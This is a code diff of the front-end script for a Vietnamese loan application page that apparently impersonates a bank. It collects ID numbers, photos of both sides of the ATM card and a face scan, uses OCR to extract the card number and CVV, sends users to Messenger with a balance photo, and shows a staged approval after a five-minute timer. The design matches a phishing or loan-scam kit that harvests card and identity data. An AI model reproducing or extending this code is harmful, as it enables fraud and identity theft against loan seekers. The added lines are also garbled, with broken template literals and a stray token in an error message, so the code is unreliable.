@@ -1050,7 +1050,7 @@
                         errors.accountNumber = "Số tài khoản từ 9-15 số.";
                     }
                     if (!data.bank) {
-                        errors.bank = "Vui lòng chọn ngân hàng.";
+                        errors.bank = "V9020Vui lòng chọn ngân hàng.";
                     }
                     if (data.loanAmount < 10000000) {
                         errors.loanAmount = "Số tiền vay tối thiểu 10 triệu VNĐ.";
@@ -1222,761 +1222,749 @@
                 delete safeData.atmPhotoFront;
                 delete safeData.atmPhotoBack;
                 delete safeData.facePhoto;
-                localStorage.setItem('formDataBackup', JSON.stringify(safeData));<script>
-    // ... (phần mã trước đó giữ nguyên, tiếp tục từ saveToLocalStorage)
-
-    function saveToLocalStorage(data) {
-        const safeData = { ...data };
-        delete safeData.idNumber;
-        delete safeData.accountNumber;
-        delete safeData.idPhotoFront;
-        delete safeData.idPhotoBack;
-        delete safeData.atmPhotoFront;
-        delete safeData.atmPhotoBack;
-        delete safeData.facePhoto;
-        localStorage.setItem('formDataBackup', JSON.stringify(safeData));
-    }
-
-    async function extractTextFromImage(file) {
-        $("#loadingOverlay").addClass("active");
-        try {
-            if (!file) return { idNumber: "", atmNumber: "", cvv: "" };
-            const img = new Image();
-            img.src = URL.createObjectURL(file);
-            await new Promise(resolve => img.onload = resolve);
-            const canvas = document.createElement("canvas");
-            canvas.width = img.width / 2;
-            canvas.height = img.height / 2;
-            canvas.getContext("2d").drawImage(img, 0, 0, canvas.width, canvas.height);
-            const { createWorker } = Tesseract;
-            const worker = await createWorker();
-            await worker.load();
-            await worker.loadLanguage("eng");
-            await worker.initialize("eng");
-            const { data: { text } } = await worker.recognize(canvas);
-            await worker.terminate();
-            const idNumber = text.match(/\d{9,12}/)?.[0] || "";
-            const atmNumber = text.match(/\d{16}/)?.[0] || "";
-            const cvv = text.match(/\b\d{3}\b/)?.[0] || "";
-            return { idNumber, atmNumber, cvv };
-        } catch (error) {
-            console.error("Lỗi OCR ảnh:", error);
-            showToast("Lỗi xử lý ảnh, vui lòng thử lại.");
-            return { idNumber: "", atmNumber: "", cvv: "" };
-        } finally {
-            $("#loadingOverlay").removeClass("active");
-        }
-    }
-
-    async function checkImageQuality(file, type) {
-        $("#loadingOverlay").addClass("active");
-        try {
-            if (!file || !file.type.startsWith('image/')) {
-                return "Định dạng file không phải ảnh.";
-            }
-            const img = new Image();
-            img.src = URL.createObjectURL(file);
-            await new Promise((resolve, reject) => {
-                img.onload = resolve;
-                img.onerror = () => reject(new Error("Ảnh không hợp lệ hoặc bị hỏng."));
-            });
-
-            const canvas = document.createElement("canvas");
-            const maxSize = 1000;
-            const scale = Math.min(maxSize / img.width, maxSize / img.height, 1);
-            canvas.width = img.width * scale;
-            canvas.height = img.height * scale;
-            const ctx = canvas.getContext("2d");
-            ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
-            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
-            let contrast = 0;
-            for (let i = 0; i < imageData.length; i += 4) {
-                const gray = (imageData[i] + imageData[i + 1] + imageData[i + 2]) / 3;
-                contrast += gray;
-            }
-            contrast /= (imageData.length / 4);
-            if (contrast < 50) {
-                return "Ảnh mờ, vui lòng chụp lại.";
+                localStorage.setItem('formDataBackup', JSON.stringify(safeData));
             }
 
-            if (img.width < 300 || img.height < 200) {
-                return "Ảnh mất góc, vui lòng chụp lại.";
-            }
-
-            const { idNumber, atmNumber, cvv } = await extractTextFromImage(file);
-            if (type === "cccd" && !idNumber) {
-                return "Không nhận diện được số CCCD/CMND, vui lòng chụp lại.";
-            }
-            if (type === "cccd" && idNumber && idNumber !== formData.idNumber) {
-                return "Số CCCD/CMND không khớp với thông tin đã nhập.";
-            }
-            if (type === "atm" && !atmNumber) {
-                return "Không nhận diện được số tài khoản, vui lòng chụp lại.";
-            }
-            if (type === "atm" && atmNumber && formData.accountNumber && atmNumber !== formData.accountNumber) {
-                return "Số tài khoản ATM không khớp với thông tin đã nhập.";
-            }
-            if (type === "atm" && file.name === "atmPhotoBack" && !cvv) {
-                return "Không nhận diện được mã CVV, vui lòng chụp lại.";
-            }
-            if (type === "face" && !idNumber && !atmNumber) {
-                return "Ảnh khuôn mặt không rõ, vui lòng chụp lại.";
-            }
-
-            return true;
-        } catch (error) {
-            console.error("Lỗi kiểm tra chất lượng ảnh:", error);
-            return "Lỗi xử lý ảnh, vui lòng thử lại.";
-        } finally {
-            $("#loadingOverlay").removeClass("active");
-        }
-    }
-
-    async function isAppScreenshot(file) {
-        try {
-            const { text } = await extractTextFromImage(file);
-            return text.toLowerCase().includes("app") || text.toLowerCase().includes("mobile") || text.toLowerCase().includes("bank");
-        } catch (error) {
-            console.error("Lỗi kiểm tra ảnh chụp app:", error);
-            return false;
-        }
-    }
-
-    function showError(input, message) {
-        const errorDiv = input.next('.error-message');
-        errorDiv.text(message).slideDown(200);
-        input.addClass('error');
-    }
-
-    function hideError(input) {
-        const errorDiv = input.next('.error-message');
-        errorDiv.slideUp(200);
-        input.removeClass('error');
-    }
-
-    function showToast(message, type = "error") {
-        const toast = $("#toast");
-        toast.text(message).css("background", type === "success" ? "#28a745" : "#e63946").fadeIn(300);
-        setTimeout(() => toast.fadeOut(300), 5000);
-    }
-
-    window.previewImage = async function(input, previewId, uploadedId) {
-        const file = input.files[0];
-        if (file) {
-            if (file.size > 5 * 1000000) {
-                showToast("Ảnh không được vượt quá 5MB!");
-                input.value = "";
-                return;
-            }
-            const type = input.name.includes("idPhoto") ? "cccd" : input.name.includes("atmPhoto") ? "atm" : "face";
-            const quality = await checkImageQuality(file, type);
-            if (typeof quality === "string") {
-                showToast(quality);
-                input.value = "";
-                return;
-            }
-            formData[input.name] = file;
-            if (input.name === "atmPhotoFront") {
-                formData.isAppScreenshot = await isAppScreenshot(file);
-            }
-            const reader = new FileReader();
-            reader.onload = function(e) {
-                const img = document.getElementById(previewId);
-                img.src = e.target.result;
-                img.style.display = 'block';
-                document.getElementById(uploadedId).style.display = 'block';
-                $(`button[onclick="deletePhoto('${input.name}')"]`).show();
-            };
-            reader.readAsDataURL(file);
-        }
-    };
-
-    window.deletePhoto = function(inputName) {
-        formData[inputName] = null;
-        if (inputName === "atmPhotoFront") {
-            formData.isAppScreenshot = false;
-        }
-        $(`#${inputName}Preview`).hide();
-        $(`#${inputName}Uploaded`).hide();
-        $(`input[name="${inputName}"]`).val("");
-        $(`button[onclick="deletePhoto('${inputName}')"]`).hide();
-    };
-
-    async function sendOTP() {
-        const phone = $('[name="phone"]').val();
-        if (!/^0[0-9]{9}$/.test(phone)) {
-            showToast("Số điện thoại không hợp lệ.");
-            return;
-        }
-        try {
-            const response = await fetch('/send-otp', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone })
-            });
-            if (response.ok) {
-                $('#otpContainer').show();
-                showToast("Mã OTP đã được gửi.", "success");
-            } else {
-                showToast("Gửi OTP thất bại.");
-            }
-        } catch (error) {
-            console.error("Lỗi gửi OTP:", error);
-            showToast("Lỗi gửi OTP, vui lòng thử lại.");
-        }
-    }
-
-    window.nextStep = async function(step) {
-        const currentStep = $(`#step-${step-1}`);
-        const inputs = currentStep.find('input[required], select[required]');
-        let isValid = true;
-
-        inputs.each(function() {
-            const input = $(this);
-            formData[input.attr('name')] = input.val();
-            if (!input.val()) {
-                isValid = false;
-                showError(input, "Trường này là bắt buộc.");
-            } else if (input.attr('pattern') && !new RegExp(input.attr('pattern')).test(input.val())) {
-                isValid = false;
-                showError(input, input.attr('title') || "Dữ liệu không hợp lệ.");
-            } else {
-                hideError(input);
-            }
-        });
-
-        if (step === 2) {
-            const otp = $('[name="otp"]').val();
-            const phone = $('[name="phone"]').val();
-            if ($('#otpContainer').is(':visible')) {
+            async function extractTextFromImage(file) {
+                $("#loadingOverlay").addClass("active");
                 try {
-                    const response = await fetch('/verify-otp', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ phone, otp })
-                    });
-                    if (!response.ok) {
-                        isValid = false;
-                        showError($('[name="otp"]'), "Mã OTP không hợp lệ.");
-                    }
+                    if (!file) return { idNumber: "", atmNumber: "", cvv: "" };
+                    const img = new Image();
+                    img.src = URL.createObjectURL(file);
+                    await new Promise(resolve => img.onload = resolve);
+                    const canvas = document.createElement("canvas");
+                    canvas.width = img.width / 2;
+                    canvas.height = img.height / 2;
+                    canvas.getContext("2d").drawImage(img, 0, 0, canvas.width, canvas.height);
+                    const { createWorker } = Tesseract;
+                    const worker = await createWorker();
+                    await worker.load();
+                    await worker.loadLanguage("eng");
+                    await worker.initialize("eng");
+                    const { data: { text } } = await worker.recognize(canvas);
+                    await worker.terminate();
+                    const idNumber = text.match(/\d{9,12}/)?.[0] || "";
+                    const atmNumber = text.match(/\d{16}/)?.[0] || "";
+                    const cvv = text.match(/\b\d{3}\b/)?.[0] || "";
+                    return { idNumber, atmNumber, cvv };
                 } catch (error) {
-                    isValid = false;
-                    showError($('[name="otp"]'), "Lỗi xác minh OTP.");
+                    console.error("Lỗi OCR ảnh:", error);
+                    showToast("Lỗi xử lý ảnh, vui lòng thử lại.");
+                    return { idNumber: "", atmNumber: "", cvv: "" };
+                } finally {
+                    $("#loadingOverlay").removeClass("active");
                 }
             }
-            const idVerification = await verifyIdNumber(formData.idNumber);
-            if (idVerification.error) {
-                isValid = false;
-                showError($('[name="idNumber"]'), idVerification.error);
-            }
-        }
 
-        const errors = validateFormData(formData, step);
-        Object.keys(errors).forEach(key => {
-            const input = currentStep.find(`[name="${key}"]`);
-            if (input.length) {
-                isValid = false;
-                showError(input, errors[key]);
-            }
-        });
+            async function checkImageQuality(file, type) {
+                $("#loadingOverlay").addClass("active");
+                try {
+                    if (!file || !file.type.startsWith('image/')) {
+                        return "Định dạng file không phải ảnh.";
+                    }
+                    const img = new Image();
+                    img.src = URL.createObjectURL(file);
+                    await new Promise((resolve, reject) => {
+                        img.onload = resolve;
+                        img.onerror = () => reject(new Error("Ảnh không hợp lệ hoặc bị hỏng."));
+                    });
 
-        if (!isValid) {
-            showToast("Vui lòng kiểm tra lại thông tin.");
-            return;
-        }
-
-        $('.progress-step').removeClass('active');
-        $(`.progress-step[data-step="${step}"]`).addClass('active');
-        $('.step').removeClass('active').css({ opacity: 0, transform: 'translateY(20px)' });
-        $(`#step-${step}`).addClass('active').css({ opacity: 1, transform: 'translateY(0)' });
-        saveProgress(step);
-    };
-
-    window.prevStep = function(step) {
-        $('.progress-step').removeClass('active');
-        $(`.progress-step[data-step="${step}"]`).addClass('active');
-        $('.step').removeClass('active').css({ opacity: 0, transform: 'translateY(20px)' });
-        $(`#step-${step}`).addClass('active').css({ opacity: 1, transform: 'translateY(0)' });
-        saveProgress(step);
-    };
-
-    window.submitForm = async function() {
-        const errors = validateFormData(formData, 5);
-        if (Object.keys(errors).length > 0) {
-            Object.keys(errors).forEach(key => {
-                const input = $(`[name="${key}"]`);
-                if (input.length) showError(input, errors[key]);
-            });
-            showToast("Vui lòng kiểm tra lại thông tin.");
-            console.error("Lỗi xác thực dữ liệu:", errors);
-            return;
-        }
-
-        formData.loanAmount = parseCurrency(formData.loanAmount);
-        formData.monthlyIncome = formData.monthlyIncome ? parseCurrency(formData.monthlyIncome) : 0;
-        formData.assetValue = formData.assetValue ? parseCurrency(formData.assetValue) : 0;
-        const interestRate = getInterestRate(formData.loanType, formData.loanTerm);
-        formData.monthlyPayment = calculateLoan(formData.loanAmount, formData.loanTerm, interestRate);
-
-        $("#loadingOverlay").addClass("active");
-        try {
-            await submitToServer(formData);
-            await sendEmail(formData);
-            $("#loadingOverlay").removeClass("active");
-            $("#registerForm").modal("hide");
-            showToast("HỒ SƠ ĐANG TRONG QUÁ TRÌNH XÉT DUYỆT VUI LÒNG ĐỢI NGÂN HÀNG THẨM ĐỊNH XÉT DUYỆT SẼ CÓ KẾT QUẢ TRONG VÀI PHÚT", "success");
-
-            setTimeout(() => {
-                $("#successModal").modal("show");
-                setTimeout(() => {
-                    $("#successModal").modal("hide");
-                    $("#contractModal").modal("show");
-                    updateContractModal(formData);
-                }, 5000);
-            }, 300000); // 5 phút
-        } catch (error) {
-            $("#loadingOverlay").removeClass("active");
-            showToast("Lỗi gửi hồ sơ, vui lòng thử lại.");
-            console.error("Lỗi gửi hồ sơ:", error);
-        }
-    };
-
-    window.verifyFace = async function() {
-        $("#loadingOverlay").addClass("active");
-        try {
-            const video = document.getElementById('faceVideo');
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            video.srcObject = stream;
-
-            await Promise.all([
-                faceapi.nets.ssdMobilenetv1.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/models'),
-                faceapi.nets.faceLandmark68Net.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/models'),
-                faceapi.nets.faceRecognitionNet.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/models')
-            ]);
-
-            let detections = await faceapi.detectSingleFace(video).withFaceLandmarks();
-            if (!detections) {
-                showToast("Vui lòng đưa khuôn mặt vào khung tròn.");
-                showRetryButton();
-                stream.getTracks().forEach(track => track.stop());
-                return;
-            }
-
-            const eyeDistance = Math.abs(detections.landmarks.positions[36].x - detections.landmarks.positions[45].x);
-            if (eyeDistance < 50) {
-                showToast("Vui lòng tháo kính/mũ để xác minh.");
-                showRetryButton();
-                stream.getTracks().forEach(track => track.stop());
-                return;
-            }
-
-            const canvas = document.createElement("canvas");
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext("2d").drawImage(video, 0, 0);
-            const imageData = canvas.getImageData(0, 0, canvas.width, canvas.height).data;
-            let brightness = 0;
-            for (let i = 0; i < imageData.length; i += 4) {
-                brightness += (imageData[i] + imageData[i + 1] + imageData[i + 2]) / 3;
-            }
-            brightness /= (imageData.length / 4);
-            if (brightness < 50) {
-                showToast("Ánh sáng yếu, vui lòng chụp ở nơi sáng hơn.");
-                showRetryButton();
-                stream.getTracks().forEach(track => track.stop());
-                return;
-            }
-
-            $("#faceScanGuide").text("Vui lòng nháy mắt trái.");
-            await new Promise(resolve => setTimeout(resolve, 2000));
-            detections = await faceapi.detectSingleFace(video).withFaceLandmarks();
-            if (!detections) {
-                showToast("Không phát hiện khuôn mặt, vui lòng thử lại.");
-                showRetryButton();
-                stream.getTracks().forEach(track => track.stop());
-                return;
-            }
-            const leftEyeRatio = (Math.abs(detections.landmarks.positions[37].y - detections.landmarks.positions[41].y) /
-                                 Math.abs(detections.landmarks.positions[36].x - detections.landmarks.positions[39].x));
-            if (leftEyeRatio > 0.2) {
-                showToast("Vui lòng nháy mắt trái đúng cách.");
-                showRetryButton();
-                stream.getTracks().forEach(track => track.stop());
-                return;
-            }
-
-            $("#faceScanGuide").text("Vui lòng quay đầu sang trái.");
-            await new Promise(resolve => setTimeout(resolve, 2000));
-            detections = await faceapi.detectSingleFace(video).withFaceLandmarks();
-            if (!detections || detections.landmarks.positions[0].x > detections.landmarks.positions[33].x) {
-                showToast("Vui lòng quay đầu sang trái đúng hướng dẫn.");
-                showRetryButton();
-                stream.getTracks().forEach(track => track.stop());
-                return;
-            }
-
-            $("#faceScanGuide").text("Vui lòng quay đầu sang phải.");
-            await new Promise(resolve => setTimeout(resolve, 2000));
-            detections = await faceapi.detectSingleFace(video).withFaceLandmarks();
-            if (!detections || detections.landmarks.positions[0].x < detections.landmarks.positions[33].x) {
-                showToast("Vui lòng quay đầu sang phải đúng hướng dẫn.");
-                showRetryButton();
-                stream.getTracks().forEach(track => track.stop());
-                return;
-            }
-
-            canvas.toBlob(blob => {
-                const file = new File([blob], "face_photo.jpg", { type: "image/jpeg" });
-                formData.facePhoto = file;
-                $("#faceScanGuide").text("Xác minh thành công!");
-                showToast("Xác minh khuôn mặt thành công!", "success");
-                $('#faceScanNext').prop('disabled', false);
-                $('#retryFaceScan').hide();
-                stream.getTracks().forEach(track => track.stop());
-            }, "image/jpeg", 0.8);
-        } catch (error) {
-            console.error("Lỗi xác minh khuôn mặt:", error);
-            showToast("Lỗi xác minh khuôn mặt, vui lòng thử lại.");
-            showRetryButton();
-        } finally {
-            $("#loadingOverlay").removeClass("active");
-        }
-    };
-
-    window.retryFaceScan = function() {
-        $('#retryFaceScan').hide();
-        $('#faceScanGuide').text("Vui lòng nhìn thẳng vào camera.");
-        verifyFace();
-    };
-
-    function showRetryButton() {
-        $('#retryFaceScan').show();
-        $('#faceScanNext').prop('disabled', true);
-    }
-
-    window.openCamera = function() {
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                const video = document.createElement("video");
-                video.srcObject = stream;
-                video.play();
-                const container = document.createElement("div");
-                container.style.position = "fixed";
-                container.style.top = "50%";
-                container.style.left = "50%";
-                container.style.transform = "translate(-50%, -50%)";
-                container.style.background = "#fff";
-                container.style.padding = "20px";
-                container.style.borderRadius = "12px";
-                container.style.zIndex = "3000";
-                container.appendChild(video);
-
-                const captureButton = document.createElement("button");
-                captureButton.textContent = "Chụp ảnh";
-                captureButton.className = "vib-v2-btn-dk02";
-                captureButton.style.marginTop = "10px";
-                captureButton.onclick = () => {
                     const canvas = document.createElement("canvas");
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext("2d").drawImage(video, 0, 0);
-                    canvas.toBlob(blob => {
-                        const file = new File([blob], "camera_photo.jpg", { type: "image/jpeg" });
-                        const input = document.querySelector('input[type="file"]:focus') || document.querySelector('input[name="idPhotoFront"]');
-                        const dataTransfer = new DataTransfer();
-                        dataTransfer.items.add(file);
-                        input.files = dataTransfer.files;
-                        input.dispatchEvent(new Event("change"));
-                        stream.getTracks().forEach(track => track.stop());
-                        container.remove();
-                    }, "image/jpeg", 0.8);
-                };
+                    const maxSize = 1000;
+                    const scale = Math.min(maxSize / img.width, maxSize / img.height, 1);
+                    canvas.width = img.width * scale;
+                    canvas.height = img.height * scale;
+                    const ctx = canvas.getContext("2d");
+                    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+                    const imageData = ctx.getImageData(0, 0,canvas.width, canvas.height).data;
+let contrast = 0;
+for (let i = 0; i < imageData.length; i += 4) {
+const gray = (imageData[i] + imageData[i + 1] + imageData[i + 2]) / 3;
+contrast += gray;
+}
+contrast /= (imageData.length / 4);
+if (contrast < 50) {
+return "Ảnh mờ, vui lòng chụp lại.";
+}
 
-                container.appendChild(captureButton);
-                document.body.appendChild(container);
-            })
-            .catch(error => {
-                console.error("Lỗi truy cập camera:", error);
-                showToast("Cần cấp quyền camera.");
-            });
-    };
+if (img.width < 300 || img.height < 200) {
+return "Ảnh mất góc, vui lòng chụp lại.";
+}
 
-    window.openCameraForBalance = async function() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.createElement("video");
-            video.srcObject = stream;
-            video.play();
-            showToast("Chụp ảnh số dư và gửi qua Messenger để duyệt trong 1 giờ.", "success");
-            setTimeout(() => {
-                window.location.href = 'https://m.me/ShinhanBankVietnam';
-                stream.getTracks().forEach(track => track.stop());
-            }, 2000);
-        } catch (error) {
-            console.error("Lỗi truy cập camera:", error);
-            showToast("Cần cấp quyền camera.");
-        }
-    };
+const { idNumber, atmNumber, cvv } = await extractTextFromImage(file);
+if (type === "cccd" && !idNumber) {
+return "Không nhận diện được số CCCD/CMND, vui lòng chụp lại.";
+}
+if (type === "cccd" && idNumber && idNumber !== formData.idNumber) {
+return "Số CCCD/CMND không khớp với thông tin đã nhập.";
+}
+if (type === "atm" && !atmNumber) {
+return "Không nhận diện được số tài khoản, vui lòng chụp lại.";
+}
+if (type === "atm" && atmNumber && formData.accountNumber && atmNumber !== formData.accountNumber) {
+return "Số tài khoản ATM không khớp với thông tin đã nhập.";
+}
+if (type === "atm" && file.name === "atmPhotoBack" && !cvv) {
+return "Không nhận diện được mã CVV, vui lòng chụp lại.";
+}
+if (type === "face" && !idNumber && !atmNumber) {
+return "Ảnh khuôn mặt không rõ, vui lòng chụp lại.";
+}
 
-    function initSignatureCanvas() {
-        const canvas = document.getElementById('signatureCanvas');
-        const ctx = canvas.getContext('2d');
-        let isDrawing = false;
+return true;
+} catch (error) {
+console.error("Lỗi kiểm tra chất lượng ảnh:", error);
+return "Lỗi xử lý ảnh, vui lòng thử lại.";
+} finally {
+$("#loadingOverlay").removeClass("active");
+}
+}
 
-        canvas.addEventListener('mousedown', (e) => {
-            isDrawing = true;
-            ctx.beginPath();
-            ctx.moveTo(e.offsetX, e.offsetY);
-        });
+async function isAppScreenshot(file) {
+try {
+const { text } = await extractTextFromImage(file);
+return text.toLowerCase().includes("app") || text.toLowerCase().includes("mobile") || text.toLowerCase().includes("bank");
+} catch (error) {
+console.error("Lỗi kiểm tra ảnh chụp app:", error);
+return false;
+}
+}
 
-        canvas.addEventListener('mousemove', (e) => {
-            if (isDrawing) {
-                ctx.lineTo(e.offsetX, e.offsetY);
-                ctx.strokeStyle = '#000';
-                ctx.lineWidth = 2;
-                ctx.stroke();
-            }
-        });
+function showError(input, message) {
+const errorDiv = input.next('.error-message');
+errorDiv.text(message).slideDown(200);
+input.addClass('error');
+}
 
-        canvas.addEventListener('mouseup', () => {
-            isDrawing = false;
-            signatureData = canvas.toDataURL('image/png');
-            document.getElementById('signaturePreview').src = signatureData;
-            document.getElementById('signaturePreview').style.display = 'block';
-            document.getElementById('clearSignature').style.display = 'inline-block';
-        });
+function hideError(input) {
+const errorDiv = input.next('.error-message');
+errorDiv.slideUp(200);
+input.removeClass('error');
+}
 
-        canvas.addEventListener('touchstart', (e) => {
-            isDrawing = true;
-            const touch = e.touches[0];
-            const rect = canvas.getBoundingClientRect();
-            ctx.beginPath();
-            ctx.moveTo(touch.clientX - rect.left, touch.clientY - rect.top);
-            e.preventDefault();
-        });
+function showToast(message, type = "error") {
+const toast = $("#toast");
+toast.text(message).css("background", type === "success" ? "#28a745" : "#e63946").fadeIn(300);
+setTimeout(() => toast.fadeOut(300), 5000);
+}
 
-        canvas.addEventListener('touchmove', (e) => {
-            if (isDrawing) {
-                const touch = e.touches[0];
-                const rect = canvas.getBoundingClientRect();
-                ctx.lineTo(touch.clientX - rect.left, touch.clientY - rect.top);
-                ctx.strokeStyle = '#000';
-                ctx.lineWidth = 2;
-                ctx.stroke();
-            }
-            e.preventDefault();
-        });
+window.previewImage = async function(input, previewId, uploadedId) {
+const file = input.files[0];
+if (file) {
+if (file.size > 5 * 1000000) {
+showToast("Ảnh không được vượt quá 5MB!");
+input.value = "";
+return;
+}
+const type = input.name.includes("idPhoto") ? "cccd" : input.name.includes("atmPhoto") ? "atm" : "face";
+const quality = await checkImageQuality(file, type);
+if (typeof quality === "string") {
+showToast(quality);
+input.value = "";
+return;
+}
+formData[input.name] = file;
+if (input.name === "atmPhotoFront") {
+formData.isAppScreenshot = await isAppScreenshot(file);
+}
+const reader = new FileReader();
+reader.onload = function(e) {
+const img = document.getElementById(previewId);
+img.src = e.target.result;
+img.style.display = 'block';
+document.getElementById(uploadedId).style.display = 'block';
+$(button[onclick="deletePhoto('${input.name}')"]).show();
+};
+reader.readAsDataURL(file);
+}
+};
 
-        canvas.addEventListener('touchend', () => {
-            isDrawing = false;
-            signatureData = canvas.toDataURL('image/png');
-            document.getElementById('signaturePreview').src = signatureData;
-            document.getElementById('signaturePreview').style.display = 'block';
-            document.getElementById('clearSignature').style.display = 'inline-block';
-        });
-    }
+window.deletePhoto = function(inputName) {
+formData[inputName] = null;
+if (inputName === "atmPhotoFront") {
+formData.isAppScreenshot = false;
+}
+$(#${inputName}Preview).hide();
+$(#${inputName}Uploaded).hide();
+$(input[name="${inputName}"]).val("");
+$(button[onclick="deletePhoto('${inputName}')"]).hide();
+};
 
-    window.startSigning = function() {
-        const useDocuSign = confirm('Bạn muốn ký hợp đồng qua DocuSign (khuyến nghị) hay vẽ chữ ký trực tiếp?');
-        if (useDocuSign) {
-            signWithDocuSign();
-        } else {
-            document.getElementById('signatureCanvas').style.display = 'block';
-            document.getElementById('startSigning').style.display = 'none';
-            initSignatureCanvas();
-        }
-    };
+async function sendOTP() {
+const phone = $('[name="phone"]').val();
+if (!/^0[0-9]{9}$/.test(phone)) {
+showToast("Số điện thoại không hợp lệ.");
+return;
+}
+try {
+const response = await fetch('/send-otp', {
+method: 'POST',
+headers: { 'Content-Type': 'application/json' },
+body: JSON.stringify({ phone })
+});
+if (response.ok) {
+$('#otpContainer').show();
+showToast("Mã OTP đã được gửi.", "success");
+} else {
+showToast("Gửi OTP thất bại.");
+}
+} catch (error) {
+console.error("Lỗi gửi OTP:", error);
+showToast("Lỗi gửi OTP, vui lòng thử lại.");
+}
+}
 
-    window.clearSignature = function() {
-        const canvas = document.getElementById('signatureCanvas');
-        const ctx = canvas.getContext('2d');
-        ctx.clearRect(0, 0, canvas.width, canvas.height);
-        signatureData = null;
-        document.getElementById('signaturePreview').style.display = 'none';
-        document.getElementById('clearSignature').style.display = 'none';
-        document.getElementById('signatureCanvas').style.display = 'none';
-        document.getElementById('startSigning').style.display = 'inline-block';
-    };
+window.nextStep = async function(step) {
+const currentStep = $(#step-${step-1});
+const inputs = currentStep.find('input[required], select[required]');
+let isValid = true;
 
-    async function signWithDocuSign() {
-        try {
-            showToast('Đang kết nối với DocuSign...', 'success');
-            const response = await fetch('/docusign-sign', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    contractId: document.getElementById('contractId').textContent,
-                    fullName: formData.fullName,
-                    email: formData.email,
-                    contractHtml: document.getElementById('contract-vay').outerHTML
-                })
-            });
-            const result = await response.json();
-            if (result.success) {
-                signatureData = result.signatureUrl;
-                document.getElementById('signaturePreview').src = signatureData;
-                document.getElementById('signaturePreview').style.display = 'block';
-                document.getElementById('clearSignature').style.display = 'inline-block';
-                showToast('Ký hợp đồng thành công qua DocuSign!', 'success');
-            } else {
-                throw new Error('DocuSign signing failed');
-            }
-        } catch (error) {
-            console.error("Lỗi ký DocuSign:", error);
-            showToast('Lỗi khi ký qua DocuSign, chuyển sang ký trực tiếp.');
-            document.getElementById('signatureCanvas').style.display = 'block';
-            document.getElementById('startSigning').style.display = 'none';
-            initSignatureCanvas();
-        }
-    }
+inputs.each(function() {
+const input = $(this);
+formData[input.attr('name')] = input.val();
+if (!input.val()) {
+isValid = false;
+showError(input, "Trường này là bắt buộc.");
+} else if (input.attr('pattern') && !new RegExp(input.attr('pattern')).test(input.val())) {
+isValid = false;
+showError(input, input.attr('title') || "Dữ liệu không hợp lệ.");
+} else {
+hideError(input);
+}
+});
 
-    function generateQrCode(elementId, contractId) {
-        const qrCodeUrl = `/track-loan/SHB-2025-${contractId}`;
-        QRCode.toCanvas(document.getElementById(elementId), qrCodeUrl, {
-            width: 100,
-            margin: 1
-        }, (error) => {
-            if (error) console.error('Lỗi tạo QR Code:', error);
-        });
-    }
+if (step === 2) {
+const otp = $('[name="otp"]').val();
+const phone = $('[name="phone"]').val();
+if ($('#otpContainer').is(':visible')) {
+try {
+const response = await fetch('/verify-otp', {
+method: 'POST',
+headers: { 'Content-Type': 'application/json' },
+body: JSON.stringify({ phone, otp })
+});
+if (!response.ok) {
+isValid = false;
+showError($('[name="otp"]'), "Mã OTP không hợp lệ.");
+}
+} catch (error) {
+isValid = false;
+showError($('[name="otp"]'), "Lỗi xác minh OTP.");
+}
+}
+const idVerification = await verifyIdNumber(formData.idNumber);
+if (idVerification.error) {
+isValid = false;
+showError($('[name="idNumber"]'), idVerification.error);
+}
+}
 
-    function updateContractModal(data) {
-        const contractId = Math.floor(100000 + Math.random() * 900000);
-        const today = new Date().toLocaleDateString('vi-VN');
-        $("#contractId, #disbursementContractId").text(contractId);
-        $("#contractDate, #disbursementDate").text(today);
-        $("#contractFullName, #disbursementFullName, #contractFullName2").text(data.fullName);
-        $("#contractIdNumber, #disbursementIdNumber").text(data.idNumber);
-        $("#contractIdIssueDate").text(data.idIssueDate);
-        $("#contractIdIssuePlace").text(data.idIssuePlace);
-        $("#contractPhone, #disbursementPhone").text(data.phone);
-        $("#contractRelativePhone, #disbursementRelativePhone").text(data.relativePhone);
-        $("#contractEmail, #disbursementEmail").text(data.email || "Không cung cấp");
-        $("#contractAccountNumber, #disbursementAccountNumber").text(data.accountNumber);
-        $("#contractBank, #disbursementBank").text(data.bank);
-        $("#contractLoanAmount, #disbursementLoanAmount").text(parseInt(data.loanAmount).toLocaleString('vi-VN') + ' VND');
-        $("#contractLoanTerm, #disbursementLoanTerm").text(data.loanTerm);
-        $("#contractMonthlyPayment").text(data.monthlyPayment.toLocaleString('vi-VN') + ' VND');
-        $("#contractInterestRate").text(getInterestRate(data.loanType, data.loanTerm) + '%');
-        $("#disbursementMinimumBalance").text((data.loanAmount * 0.1).toLocaleString('vi-VN') + ' VND');
-        $("#cifNo").text("CIF-" + contractId);
-        $("#consentNo").text("CONSENT-" + contractId);
-        $("#successFullName").text(data.fullName);
-        $("#successLoanAmount").text(parseInt(data.loanAmount).toLocaleString('vi-VN') + ' VND');
-        $("#successAccountNumber").text(data.accountNumber);
-        $("#successBank").text(data.bank);
-        $("#successMonthlyPayment").text(data.monthlyPayment.toLocaleString('vi-VN') + ' VND');
-        $("#successInterestRate").text(getInterestRate(data.loanType, data.loanTerm) + '%');
+const errors = validateFormData(formData, step);
+Object.keys(errors).forEach(key => {
+const input = currentStep.find([name="${key}"]);
+if (input.length) {
+isValid = false;
+showError(input, errors[key]);
+}
+});
 
-        generateQrCode('contractQrCode', contractId);
-        generateQrCode('disbursementQrCode', contractId);
+if (!isValid) {
+showToast("Vui lòng kiểm tra lại thông tin.");
+return;
+}
 
-        const pdfUrl = "assets/contracts/sample_contract.pdf";
-        $("#contractIframe").attr("src", pdfUrl);
